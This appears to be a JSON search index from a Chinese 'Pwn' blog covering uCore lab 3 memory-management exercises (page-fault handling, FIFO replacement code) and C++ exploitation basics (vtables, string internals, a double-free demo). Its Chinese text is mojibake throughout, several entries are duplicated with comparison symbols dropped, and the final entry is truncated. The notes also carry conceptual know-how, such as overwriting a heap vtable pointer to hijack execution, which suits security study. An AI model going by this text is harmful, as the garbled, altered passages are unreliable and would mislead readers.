","date":"2021-12-01","objectID":"/ucore-lab-3/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#å…·ä½“å®ç°-1"},{"categories":["Pwning"],"content":"ç¼ºé¡µç‡ç½®æ¢ç®—æ³•ï¼ˆPPFï¼‰ç®€ä»‹é€šè¿‡è°ƒèŠ‚å¸¸é©»é›†å¤§å°ï¼Œä½¿æ¯ä¸ªè¿›ç¨‹çš„ç¼ºé¡µç‡ä¿æŒåœ¨ä¸€ä¸ªåˆç†çš„èŒƒå›´å†…ã€‚ è‹¥è¿›ç¨‹ç¼ºé¡µç‡è¿‡é«˜ï¼Œåˆ™å¢åŠ å¸¸é©»é›†ä»¥åˆ†é…æ›´å¤šçš„ç‰©ç†å†…å­˜ è‹¥è¿›ç¨‹ç¼ºé¡µç‡è¿‡ä½ï¼Œåˆ™å‡å°å¸¸é©»é›†ä»¥å‡å°å®ƒçš„ç‰©ç†é¡µé¢æ•°ã€‚ å…·ä½“å®ç° è®¿å­˜æ—¶ï¼Œè®¾ç½®å¼•ç”¨ä½æ ‡å¿— ç¼ºé¡µæ—¶ï¼Œè®¡ç®—ä»ä¸Šæ¬¡ç¼ºé¡µæ—¶é—´$t_{last}$åˆ°ç°åœ¨$t_{current}$çš„æ—¶é—´é—´éš” å¦‚æœ$t_{current}âˆ’t_{last}\u003eT$ï¼Œåˆ™ç½®æ¢æ‰€æœ‰åœ¨$[t_{last},t_{current}]$æ—¶é—´å†…æ²¡æœ‰è¢«å¼•ç”¨çš„é¡µã€‚ å¦‚æœ$t_{current}âˆ’t_{last}\u003cT$ï¼Œåˆ™å¢åŠ ç¼ºå¤±é¡µåˆ°å¸¸é©»é›†ä¸­ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#ç¼ºé¡µç‡ç½®æ¢ç®—æ³•ppf"},{"categories":["Pwning"],"content":"ç¼ºé¡µç‡ç½®æ¢ç®—æ³•ï¼ˆPPFï¼‰ç®€ä»‹é€šè¿‡è°ƒèŠ‚å¸¸é©»é›†å¤§å°ï¼Œä½¿æ¯ä¸ªè¿›ç¨‹çš„ç¼ºé¡µç‡ä¿æŒåœ¨ä¸€ä¸ªåˆç†çš„èŒƒå›´å†…ã€‚ è‹¥è¿›ç¨‹ç¼ºé¡µç‡è¿‡é«˜ï¼Œåˆ™å¢åŠ å¸¸é©»é›†ä»¥åˆ†é…æ›´å¤šçš„ç‰©ç†å†…å­˜ è‹¥è¿›ç¨‹ç¼ºé¡µç‡è¿‡ä½ï¼Œåˆ™å‡å°å¸¸é©»é›†ä»¥å‡å°å®ƒçš„ç‰©ç†é¡µé¢æ•°ã€‚ å…·ä½“å®ç° è®¿å­˜æ—¶ï¼Œè®¾ç½®å¼•ç”¨ä½æ ‡å¿— ç¼ºé¡µæ—¶ï¼Œè®¡ç®—ä»ä¸Šæ¬¡ç¼ºé¡µæ—¶é—´$t_{last}$åˆ°ç°åœ¨$t_{current}$çš„æ—¶é—´é—´éš” å¦‚æœ$t_{current}âˆ’t_{last}T$ï¼Œåˆ™ç½®æ¢æ‰€æœ‰åœ¨$[t_{last},t_{current}]$æ—¶é—´å†…æ²¡æœ‰è¢«å¼•ç”¨çš„é¡µã€‚ å¦‚æœ$t_{current}âˆ’t_{last}","date":"2021-12-01","objectID":"/ucore-lab-3/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#ç®€ä»‹-2"},{"categories":["Pwning"],"content":"ç¼ºé¡µç‡ç½®æ¢ç®—æ³•ï¼ˆPPFï¼‰ç®€ä»‹é€šè¿‡è°ƒèŠ‚å¸¸é©»é›†å¤§å°ï¼Œä½¿æ¯ä¸ªè¿›ç¨‹çš„ç¼ºé¡µç‡ä¿æŒåœ¨ä¸€ä¸ªåˆç†çš„èŒƒå›´å†…ã€‚ è‹¥è¿›ç¨‹ç¼ºé¡µç‡è¿‡é«˜ï¼Œåˆ™å¢åŠ å¸¸é©»é›†ä»¥åˆ†é…æ›´å¤šçš„ç‰©ç†å†…å­˜ è‹¥è¿›ç¨‹ç¼ºé¡µç‡è¿‡ä½ï¼Œåˆ™å‡å°å¸¸é©»é›†ä»¥å‡å°å®ƒçš„ç‰©ç†é¡µé¢æ•°ã€‚ å…·ä½“å®ç° è®¿å­˜æ—¶ï¼Œè®¾ç½®å¼•ç”¨ä½æ ‡å¿— ç¼ºé¡µæ—¶ï¼Œè®¡ç®—ä»ä¸Šæ¬¡ç¼ºé¡µæ—¶é—´$t_{last}$åˆ°ç°åœ¨$t_{current}$çš„æ—¶é—´é—´éš” å¦‚æœ$t_{current}âˆ’t_{last}T$ï¼Œåˆ™ç½®æ¢æ‰€æœ‰åœ¨$[t_{last},t_{current}]$æ—¶é—´å†…æ²¡æœ‰è¢«å¼•ç”¨çš„é¡µã€‚ å¦‚æœ$t_{current}âˆ’t_{last}","date":"2021-12-01","objectID":"/ucore-lab-3/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#å…·ä½“å®ç°-2"},{"categories":["Pwning"],"content":"æŠ–åŠ¨é—®é¢˜ï¼ˆthrashingï¼‰å¦‚æœåˆ†é…ç»™ä¸€ä¸ªè¿›ç¨‹çš„ç‰©ç†é¡µé¢å¤ªå°‘ï¼Œä¸èƒ½åŒ…å«æ•´ä¸ªçš„å·¥ä½œé›†ï¼Œå³å¸¸é©»é›†å±äºå·¥ä½œé›†ï¼Œé‚£ä¹ˆè¿›ç¨‹å°†ä¼šé€ æˆå¾ˆå¤šçš„é¡µé¢ä¸­æ–­ï¼Œéœ€è¦é¢‘ç¹çš„åœ¨å†…å­˜å’Œå¤–å­˜ä¹‹é—´æ›¿æ¢é¡µé¢ï¼Œä»è€Œä½¿è¿›ç¨‹çš„è¿è¡Œé€Ÿåº¦å˜å¾—å¾ˆæ…¢ï¼Œè¿™ç§çŠ¶æ€ç§°ä¸ºæŠ–åŠ¨ã€‚ äº§ç”ŸæŠ–åŠ¨çš„åŸå› ï¼šéšç€é©»ç•™å†…å­˜çš„è¿›ç¨‹æ•°ç›®å¢åŠ ï¼Œåˆ†é…ç»™æ¯ä¸ªè¿›ç¨‹çš„ç‰©ç†é¡µé¢æ•°ä¸æ–­å‡å°ï¼Œç¼ºé¡µç‡ä¸æ–­ä¸Šå‡ã€‚æ‰€ä»¥æ“ä½œç³»ç»Ÿè¦é€‰æ‹©ä¸€ä¸ªé€‚å½“çš„è¿›ç¨‹æ•°ç›®å’Œè¿›ç¨‹æ‰€éœ€è¦çš„å¸§æ•°ï¼Œä»¥ä¾¿åœ¨å¹¶å‘æ°´å¹³å’Œç¼ºé¡µç‡ä¹‹é—´è¾¾åˆ°ä¸€ä¸ªå¹³è¡¡ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:3","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#æŠ–åŠ¨é—®é¢˜thrashing"},{"categories":["Pwning"],"content":"ç»ƒä¹ 1ç»™æœªè¢«æ˜ å°„çš„åœ°å€æ˜ å°„ä¸Šç‰©ç†é¡µ æ³¨æ„å‘ç”Ÿpage falutçš„ä¸¤ç§æƒ…å†µï¼š ç‰©ç†é¡µæœªè¢«æ˜ å°„ï¼Œé¡µè¡¨é¡¹ä¸ºç©º é¡µè¡¨é¡¹ä¸ä¸ºç©ºï¼Œå¯¹åº”çš„ç‰©ç†é¡µé¢è¢«æ¢å‡ºåˆ°swap /*LAB3 EXERCISE 1: YOUR CODE*/ //(1) try to find a pte, if pte's PT(Page Table) isn't existed, then create a PT. if((ptep = get_pte(mm-\u003epgdir, addr, 1)) == NULL) { cprintf(\"get_pte in do_pgfalut failed\\n\"); goto failed; } if (*ptep == 0) { //(2) if the phy addr isn't exist, then alloc a page \u0026 map the phy addr with logical addr if(pgdir_alloc_page(mm-\u003epgdir, addr, perm) == NULL) { cprintf(\"pgdir_alloc_page in do_pgfalut failed\\n\"); goto failed; } } else { /*LAB3 EXERCISE 2: YOUR CODE * Now we think this pte is a swap entry, we should load data from disk to a page with phy addr, * and map the phy addr with logical addr, trigger swap manager to record the access situation of this page. * * Some Useful MACROs and DEFINEs, you can use them in below implementation. * MACROs or Functions: * swap_in(mm, addr, \u0026page) : alloc a memory page, then according to the swap entry in PTE for addr, * find the addr of disk page, read the content of disk page into this memroy page * page_insert ï¼š build the map of phy addr of an Page with the linear addr la * swap_map_swappable ï¼š set the page swappable */ if(swap_init_ok) { struct Page *page = NULL; //(1ï¼‰According to the mm AND addr, try to load the content of right disk page // into the memory which page managed. if((ret = swap_in(mm, addr, \u0026page)) != 0) { cprintf(\"swap_in in do_pgfalut failed\\n\"); goto failed; } //(2) According to the mm, addr AND page, setup the map of phy addr \u003c---\u003e logical addr page_insert(mm-\u003epgdir, page, addr, perm); //(3) make the page swappable. swap_map_swappable(mm, addr, page, 1); page-\u003epra_vaddr = addr; } else { cprintf(\"no swap_init_ok but ptep is %x, failed\\n\", *ptep); goto failed; } } ","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#ç»ƒä¹ 1"},{"categories":["Pwning"],"content":"ç»ƒä¹ 2è¡¥å……å®ŒæˆåŸºäºFIFOçš„é¡µé¢æ›¿æ¢ç®—æ³• FIFOçš„PRAç»´æŠ¤äº†ä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨ä¸­çš„é¡µæŒ‰ç…§ä»æ—§ï¼ˆé©»ç•™æ—¶é—´æœ€é•¿ï¼‰åˆ°æ–°ï¼ˆæœ€è¿‘é©»ç•™ï¼‰çš„é¡ºåºæ’åˆ—ã€‚ æ‰€ä»¥åœ¨æ¢å…¥ä¸€ä¸ªé¡µé¢æ—¶ï¼Œéœ€è¦å°†å…¶åŠ å…¥åˆ°é“¾è¡¨çš„å°¾éƒ¨ã€‚æ¢å‡ºæ—¶ï¼Œåªè¦å°†é“¾è¡¨å¤´æŒ‡å‘çš„é¡µæ¢å‡ºã€‚ static int _fifo_map_swappable(struct mm_struct *mm, uintptr_t addr, struct Page *page, int swap_in) { list_entry_t *head=(list_entry_t*) mm-\u003esm_priv; list_entry_t *entry=\u0026(page-\u003epra_page_link); assert(entry != NULL \u0026\u0026 head != NULL); //record the page access situlation /*LAB3 EXERCISE 2: YOUR CODE*/ //(1)link the most recent arrival page at the back of the pra_list_head qeueue. list_add(head-\u003eprev, entry); return 0; } static int _fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, int in_tick) { list_entry_t *head=(list_entry_t*) mm-\u003esm_priv; assert(head != NULL); assert(in_tick==0); /* Select the victim */ /*LAB3 EXERCISE 2: YOUR CODE*/ //(1) unlink the earliest arrival page in front of pra_list_head qeueue //(2) assign the value of *ptr_page to the addr of this page list_entry_t *le = head-\u003enext; struct Page *p = le2page(le, pra_page_link); list_del(le); *ptr_page = p; return 0; } ","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#ç»ƒä¹ 2"},{"categories":["Pwning"],"content":"C++ Exploitation BasicLearn from angelboyâ€™s slide \u0026 reference link \u0026 reference link [TOC] ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:0:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#c-exploitation-basic"},{"categories":["Pwning"],"content":"Name manglingC++æ”¯æŒå‡½æ•°é‡è½½ï¼Œåœ¨Cä¸­å¦‚æœä¸¤ä¸ªå‡½æ•°é‡åï¼Œè¿™å°†ä¼šæ˜¯éå¸¸ä¸¥é‡çš„ç¼–è¯‘å™¨çº§é”™è¯¯ã€‚é—®é¢˜çš„å…³é”®åœ¨äºå‡ºç°äº†ä¸¤ä¸ªç›¸åŒçš„symbolè®©ç¼–è¯‘å™¨æ— æ³•è¯†åˆ«ã€‚ä¸ºäº†å®ç°å‡½æ•°é‡è½½ï¼Œç¼–è¯‘å™¨éœ€è¦å‘é“¾æ¥å™¨ä¼ é€’å…³äºå‡½æ•°çš„æ›´å¤šä¿¡æ¯ï¼Œä¾‹å¦‚ï¼šå‚æ•°ç±»å‹ã€è°ƒç”¨çº¦å®šå’Œè¿”å›å€¼ç±»å‹ã€‚ ä¸€ä¸ªå‡½æ•°åœ¨ä¸åŒçš„å‘½åç©ºé—´ä¸‹ä¼šæœ‰ä¸åŒçš„åç§°ã€‚è¿™å°±ä¹Ÿæ˜¯åœ¨IDAä¸­C++çš„å‡½æ•°åä¼šé‚£ä¹ˆå¥‡æ€ªã€‚ å…³äºName Manglingï¼Œwikiä¸­æœ‰éå¸¸æ£’çš„è§£é‡Šã€‚ åœ¨gdbä¸­ä½¿ç”¨set print asm-demangle onå¯ä»¥æ˜¾ç¤ºä¿®é¥°åçš„å‡½æ•°åã€‚ ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:1:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#name-mangling"},{"categories":["Pwning"],"content":"Virtual function tableå¯¹äºæ¯ä¸ªæœ‰è™šæ‹Ÿå‡½æ•°çš„ç±»ï¼Œæ ¹æ®ç±»çš„ç»§æ‰¿å±‚æ¬¡ï¼Œç¼–è¯‘å™¨å°†åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªç›¸å…³çš„è™šå‡½æ•°è¡¨ã€‚å¯¹äºæ¯ä¸ªå®ä¾‹åŒ–çš„ç±»å˜é‡ï¼Œéƒ½ä¼šåœ¨å †ä¸Šä¸ºå…¶ç”³è¯·å†…å­˜ã€‚å…¶ä¸­åŒ…å«æŒ‡å‘ç±»è™šå‡½æ•°è¡¨çš„æŒ‡é’ˆã€‚ struct A { void *vtable; type var_1; type var_; ... } vatbleåœ¨ç¨‹åºæ®µçš„åªè¯»åŒºåŸŸï¼Œä½†æ˜¯ç±»ä¸­çš„è™šè¡¨æŒ‡é’ˆå´æ˜¯åœ¨å †ä¸Šçš„ã€‚æˆ‘ä»¬å¯ä»¥overwriteå®ƒæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œã€‚ åœ¨Linux C++ä¸­å†…å­˜åˆ†é…çš„åº•å±‚è¿˜æ˜¯mallocå’Œfreeï¼Œæ‰€ä»¥chunkçš„æ•°æ®ç»“æ„æ²¡æœ‰å˜åŒ–ã€‚è™šè¡¨æŒ‡é’ˆå°±æ˜¯æ”¾åœ¨è¿”å›ç”¨æˆ·chunkçš„å¼€å¤´ï¼Œç´§æ¥ç€æ˜¯å…¶ä»–å˜é‡æ•°æ®ã€‚ ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:2:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#virtual-function-table"},{"categories":["Pwning"],"content":"Vector \u0026 String","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#vector--string"},{"categories":["Pwning"],"content":"Vectorvectoråœ¨c++ä¸­æ˜¯åŠ¨æ€æ•°ç»„ï¼Œåˆ†é…åœ¨heapä¸­ã€‚å½“å†…å­˜ä¸å¤Ÿå¤§æ—¶ï¼Œä¼šå†ç”³è¯·æ–°çš„å†…å­˜ï¼Œå¹¶å°†åŸæ¥çš„å†…å­˜freeæ‰ã€‚ æœ‰ä¸‰ä¸ªé‡è¦æˆå‘˜ï¼š _M_startï¼švectorçš„èµ·å§‹ä½ç½® _M_finishï¼švectorçš„ç»“å°¾ä½ç½® _M_end_of_storageï¼švectorå†…å­˜ç©ºé—´æœ«å°¾ æ”¾å…¥æ–°å…ƒç´ æ—¶åˆ¤æ–­ï¼Œå¦‚æœ_M_finish == _M_end_of_storageåˆ™ä¼šç”³è¯·æ–°çš„å†…å­˜ã€‚ ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:1","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#vector"},{"categories":["Pwning"],"content":"Stringstringåœ¨c++ä¸­æ˜¯åŠ¨æ€å†…å­˜æ•°ç»„ï¼Œä¹Ÿæ˜¯åˆ†é…åœ¨heapä¸­çš„ã€‚ å…¶æˆå‘˜æœ‰ï¼š sizeï¼šå­—ç¬¦ä¸²çš„é•¿åº¦ capacityï¼šè¯¥stringç©ºé—´çš„å®¹é‡ reference countï¼šå¼•ç”¨è®¡æ•° åªè¦æœ‰å…¶ä»–å…ƒç´ å¼•ç”¨è¯¥å­—ç¬¦ä¸²å°±ä¼šå¢åŠ ï¼Œå¦‚æœä¸å†å¼•ç”¨ä¼šå‡å°‘ï¼Œå½“å…¶ä¸ºé›¶ï¼Œå†…å­˜ç©ºé—´ä¼šè¢«deleteæ‰ valueï¼šå­—ç¬¦ä¸²å†…å®¹ g++ \u003c 5åœ¨å¯¹stringå˜é‡è¿›è¡Œè¾“å…¥æ—¶ï¼Œæœ‰ä¸€ç§éå¸¸æœ‰è¶£çš„æœºåˆ¶ã€‚ç¨‹åºä¼šä¸æ–­çš„å‘stringç©ºé—´å†™å…¥æ•°æ®ï¼Œsizeåˆ™é€æ¸å¢åŠ ã€‚å†™å…¥æ–°æ•°æ®æ—¶ä¼šåˆ¤æ–­ï¼Œè‹¥size == capacityï¼Œåˆ™ä¼šæ–°ç”³è¯·2*capacityçš„å†…å­˜ï¼Œå¹¶å°†åŸæœ¬çš„å†…å­˜freeã€‚åŒæ—¶ï¼Œè¢«freeçš„ç©ºé—´çš„refcntä¼šè¢«ç½®ä¸º-1ã€‚ åœ¨åˆå§‹æ—¶ï¼Œrefcntä¸º0ã€‚æ­¤æ—¶åªæœ‰å˜é‡æœ¬èº«æŒ‡å‘å†…å­˜ç©ºé—´ã€‚å¦‚æœå°†å­—ç¬¦ä¸²push_backåˆ°vectorä¸­ï¼Œåˆ™vectorçš„ç©ºé—´ä¹Ÿä¼šæœ‰æ‰§è¡Œè¿™å—å†…å­˜çš„æŒ‡é’ˆï¼Œrefcnt++ã€‚å¦‚æœå­—ç¬¦ä¸²è¢«popå‡ºæ¥ï¼Œrefcnt--ã€‚åœ¨å˜é‡ä½œç”¨åŸŸç»“æŸæ—¶ï¼Œä¼šè°ƒç”¨stringå˜é‡ææ„å‡½æ•°ï¼Œrefcnt--ï¼Œæ­¤æ—¶refcnt \u003c 0ï¼Œä¼šå°†å…¶freeã€‚ g++ \u003e 5g++\u003e5ä¹‹åå–æ¶ˆäº†COW(Copy-on-Write)æœºåˆ¶ï¼Œæ²¡æœ‰äº†refcntåŸŸã€‚è€Œæ˜¯ï¼š data length \u003c= 15 æ—¶ä½¿ç”¨local buffer data length \u003e 15 æ—¶åˆ™åœ¨heapç”³è¯·ç©ºé—´ Copy-on-Write: åœ¨å¤åˆ¶ä¸€ä¸ªå˜é‡æ—¶ï¼Œä¸ä¸€å®šä¼šå¯¹å…¶è¿›è¡Œæ›´æ”¹ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸éœ€è¦é©¬ä¸Šå°†å†…å­˜ç©ºé—´å¤åˆ¶ï¼Œåœ¨å…¶å°†è¦è¢«æ”¹å˜çš„æ—¶å€™æ‰å¤åˆ¶å®Œæ•´çš„å†…å­˜ã€‚ ä½†æ˜¯ç©ºé—´é€’å¢ä¾ç„¶æ²¡æœ‰å˜åŒ–ï¼Œæ‰€ä»¥å½“stringçš„length \u003e 15 åä¼šå¯¹å †é£æ°´äº§ç”Ÿå½±å“ã€‚ ç°åœ¨æˆå‘˜å¦‚ä¸‹ï¼š data pointerï¼šæ‰§è¡Œdataç©ºé—´ sizeï¼šåˆ†é…å‡ºå»çš„stringçš„é•¿åº¦ union local bufferï¼š size \u003c=15 æ—¶å­˜æ”¾data allocated capacityï¼šsize \u003e 15 æ—¶ç”¨æ¥è®°å½•capacity ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:2","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#string"},{"categories":["Pwning"],"content":"Stringstringåœ¨c++ä¸­æ˜¯åŠ¨æ€å†…å­˜æ•°ç»„ï¼Œä¹Ÿæ˜¯åˆ†é…åœ¨heapä¸­çš„ã€‚ å…¶æˆå‘˜æœ‰ï¼š sizeï¼šå­—ç¬¦ä¸²çš„é•¿åº¦ capacityï¼šè¯¥stringç©ºé—´çš„å®¹é‡ reference countï¼šå¼•ç”¨è®¡æ•° åªè¦æœ‰å…¶ä»–å…ƒç´ å¼•ç”¨è¯¥å­—ç¬¦ä¸²å°±ä¼šå¢åŠ ï¼Œå¦‚æœä¸å†å¼•ç”¨ä¼šå‡å°‘ï¼Œå½“å…¶ä¸ºé›¶ï¼Œå†…å­˜ç©ºé—´ä¼šè¢«deleteæ‰ valueï¼šå­—ç¬¦ä¸²å†…å®¹ g++ 5g++5ä¹‹åå–æ¶ˆäº†COW(Copy-on-Write)æœºåˆ¶ï¼Œæ²¡æœ‰äº†refcntåŸŸã€‚è€Œæ˜¯ï¼š data length 15 æ—¶åˆ™åœ¨heapç”³è¯·ç©ºé—´ Copy-on-Write: åœ¨å¤åˆ¶ä¸€ä¸ªå˜é‡æ—¶ï¼Œä¸ä¸€å®šä¼šå¯¹å…¶è¿›è¡Œæ›´æ”¹ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸éœ€è¦é©¬ä¸Šå°†å†…å­˜ç©ºé—´å¤åˆ¶ï¼Œåœ¨å…¶å°†è¦è¢«æ”¹å˜çš„æ—¶å€™æ‰å¤åˆ¶å®Œæ•´çš„å†…å­˜ã€‚ ä½†æ˜¯ç©ºé—´é€’å¢ä¾ç„¶æ²¡æœ‰å˜åŒ–ï¼Œæ‰€ä»¥å½“stringçš„length 15 åä¼šå¯¹å †é£æ°´äº§ç”Ÿå½±å“ã€‚ ç°åœ¨æˆå‘˜å¦‚ä¸‹ï¼š data pointerï¼šæ‰§è¡Œdataç©ºé—´ sizeï¼šåˆ†é…å‡ºå»çš„stringçš„é•¿åº¦ union local bufferï¼š size 15 æ—¶ç”¨æ¥è®°å½•capacity ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:2","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#g--5"},{"categories":["Pwning"],"content":"Stringstringåœ¨c++ä¸­æ˜¯åŠ¨æ€å†…å­˜æ•°ç»„ï¼Œä¹Ÿæ˜¯åˆ†é…åœ¨heapä¸­çš„ã€‚ å…¶æˆå‘˜æœ‰ï¼š sizeï¼šå­—ç¬¦ä¸²çš„é•¿åº¦ capacityï¼šè¯¥stringç©ºé—´çš„å®¹é‡ reference countï¼šå¼•ç”¨è®¡æ•° åªè¦æœ‰å…¶ä»–å…ƒç´ å¼•ç”¨è¯¥å­—ç¬¦ä¸²å°±ä¼šå¢åŠ ï¼Œå¦‚æœä¸å†å¼•ç”¨ä¼šå‡å°‘ï¼Œå½“å…¶ä¸ºé›¶ï¼Œå†…å­˜ç©ºé—´ä¼šè¢«deleteæ‰ valueï¼šå­—ç¬¦ä¸²å†…å®¹ g++ 5g++5ä¹‹åå–æ¶ˆäº†COW(Copy-on-Write)æœºåˆ¶ï¼Œæ²¡æœ‰äº†refcntåŸŸã€‚è€Œæ˜¯ï¼š data length 15 æ—¶åˆ™åœ¨heapç”³è¯·ç©ºé—´ Copy-on-Write: åœ¨å¤åˆ¶ä¸€ä¸ªå˜é‡æ—¶ï¼Œä¸ä¸€å®šä¼šå¯¹å…¶è¿›è¡Œæ›´æ”¹ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸éœ€è¦é©¬ä¸Šå°†å†…å­˜ç©ºé—´å¤åˆ¶ï¼Œåœ¨å…¶å°†è¦è¢«æ”¹å˜çš„æ—¶å€™æ‰å¤åˆ¶å®Œæ•´çš„å†…å­˜ã€‚ ä½†æ˜¯ç©ºé—´é€’å¢ä¾ç„¶æ²¡æœ‰å˜åŒ–ï¼Œæ‰€ä»¥å½“stringçš„length 15 åä¼šå¯¹å †é£æ°´äº§ç”Ÿå½±å“ã€‚ ç°åœ¨æˆå‘˜å¦‚ä¸‹ï¼š data pointerï¼šæ‰§è¡Œdataç©ºé—´ sizeï¼šåˆ†é…å‡ºå»çš„stringçš„é•¿åº¦ union local bufferï¼š size 15 æ—¶ç”¨æ¥è®°å½•capacity ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:2","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#g--5-1"},{"categories":["Pwning"],"content":"New \u0026 deleteè™½ç„¶newå’Œdeleteçš„åº•å±‚ä¾ç„¶æ˜¯mallocå’Œfreeï¼Œä½†æ˜¯ä¾ç„¶æœ‰å¾ˆå¤§çš„å·®åˆ«ã€‚ newï¼š å†…å­˜åˆ†é…å¤±è´¥ï¼Œä¸ä¼šè¿”å›NULLï¼Œè€Œæ˜¯ä¼šæŠ›å‡ºå¼‚å¸¸ è°ƒç”¨æ„é€ å‡½æ•°åˆå§‹åŒ–å˜é‡ deleteï¼š è°ƒç”¨ææ„å‡½æ•°é”€æ¯å˜é‡ é‡Šæ”¾ç©ºé—´ newå’Œmallocè¿”å›çš„æ˜¯ä¸åŒçš„ä¸œè¥¿ï¼Œnewè¿”å›ä¸€ä¸ªåˆå§‹åŒ–çš„å¯¹è±¡ï¼Œmallocè¿”å›åŸå§‹å†…å­˜æŒ‡é’ˆã€‚æ‰€ä»¥ï¼Œdeleteå’Œfreeåšäº†ä¸åŒçš„æ“ä½œï¼Œå®ƒä»¬ä¸èƒ½æ··ç”¨ï¼ newè°ƒç”¨äº†operator newï¼Œdeleteè°ƒç”¨äº†operator deleteï¼Œè€Œc++æ”¯æŒè¿ç®—ç¬¦é‡è½½ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰å®ƒä»¬ã€‚ ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:4:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#new--delete"},{"categories":["Pwning"],"content":"Copy constructor \u0026 assignment operator #include \u003ciostream\u003e#include \u003cstring\u003e#include \u003cvector\u003e#include \u003cstring.h\u003eusing namespace std; class Stu { public: Stu():name(NULL), id(0){} Stu(string str, int stuid) { name = new char[str.length()+1]; strcpy(name, str.c_str()); id = stuid; } void putinfo() { cout \u003c\u003c id \u003c\u003c \":\" \u003c\u003c name \u003c\u003c endl; } ~Stu() { delete[] name; } private: int id; char *name; }; int main() { vector\u003cStu\u003e stulist; Stu student = Stu(\"John\", 233); stulist.push_back(student); stulist[0].putinfo(); return 0; } test@test:~/ctf$ ./test 233:John free(): double free detected in tcache 2 Aborted (core dumped) é—®é¢˜åœ¨å“ªé‡Œå‘¢ï¼Ÿ å®šä¹‰ä¸¤ç§copyæ–¹å¼ shallow copyï¼šåªåšæŒ‡é’ˆçš„å¤åˆ¶ï¼ŒæŒ‡å‘çš„å†…å­˜ç©ºé—´ä¸ä¼šå‘ç”Ÿå˜åŒ– deep copyï¼šç”³è¯·æ–°çš„ç©ºé—´ï¼Œå¤åˆ¶æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œæ–°çš„æŒ‡é’ˆæŒ‡å‘æ–°çš„ç©ºé—´ c++ä¸­å¯ä»¥ä¸ºç±»å®šä¹‰copy constructorï¼Œåœ¨å¤åˆ¶å¯¹è±¡æ—¶ä¼šè¿›è¡Œè°ƒç”¨ã€‚å¦‚æœæ²¡æœ‰è‡ªå®šä¹‰åˆ™ä¼šä½¿ç”¨default copy constructorï¼Œåªè¿›è¡Œshallow copyã€‚ å¦ä¸€ç§æ“ä½œæ˜¯èµ‹å€¼è¿ç®—ç¬¦ï¼Œè¿™ä¹Ÿæ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ã€‚å¦‚æœæ²¡æœ‰ï¼Œåªè¿›è¡Œshallow copyã€‚ copy constructorä½¿ç”¨ï¼š func(class_name var)ï¼Œä»¥ç±»ä¸ºå‡½æ•°å‚æ•° retturn class_var vectorç­‰STLå®¹å™¨ â€¦ èµ‹å€¼è¿ç®—ç¬¦ä½¿ç”¨ï¼š stu1 = stu2 vectorç­‰STLå®¹å™¨ â€¦ å›åˆ°å‰é¢çš„ä»£ç ï¼Œstulist.push_back(student)åšäº†shallow copyï¼Œvectorå’Œstudentç©ºé—´ä¸­éƒ½æœ‰äº†æŒ‡å‘nameçš„æŒ‡é’ˆã€‚return 0æ—¶ï¼Œç±»å˜é‡ç”Ÿå‘½å‘¨æœŸç»“æŸï¼Œè°ƒç”¨destructoré‡Šæ”¾äº†nameæ‰€åœ¨ç©ºé—´ã€‚vectorç”Ÿå‘½å‘¨æœŸç»“æŸï¼Œä¸ºå…¶ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ è°ƒç”¨å¯¹åº”çš„destructorï¼Œé€ æˆdouble freeã€‚ ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:5:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#copy-constructor--assignment-operator"},{"categories":["Pwning"],"content":"å¼‚å¸¸å¤„ç†ç®€å•æ¥è¯´c++çš„å¼‚å¸¸å¤„ç†æœ‰ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ try åŒ…å«å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ä»£ç  throw æŠ›å‡ºå¼‚å¸¸ catch 